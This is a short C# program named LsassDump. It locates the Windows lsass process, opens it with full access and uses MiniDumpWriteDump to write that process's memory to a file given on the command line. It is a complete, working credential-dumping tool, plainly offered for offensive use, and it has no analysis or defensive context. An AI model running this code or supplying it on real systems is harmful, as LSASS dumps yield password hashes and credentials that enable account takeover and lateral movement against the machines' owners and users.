using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace LsassDump
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("[*] Usage: Program.exe <FILENAME>");
                return;
            }


            // Create a file for the dumped content of lsass
            string fLocation = $"{args[0]}";
            
            Console.WriteLine($"[+] Dumping contents to: {fLocation}");

            FileStream dumpFile = new FileStream(fLocation, FileMode.Create);

            // Grab the lsass process PID
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            Console.WriteLine($"[*] LSASS PID: {lsass_pid}");

            // Attach to the process and dump contents
            // 0x001F0FFF = ALL_ACCESS
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            if (dumped == false)
            {
                Console.WriteLine("[-] Dumping failed ! Error: {0}", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine($"[+] LSASS dumped to: {fLocation}");
        }

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
    }
}
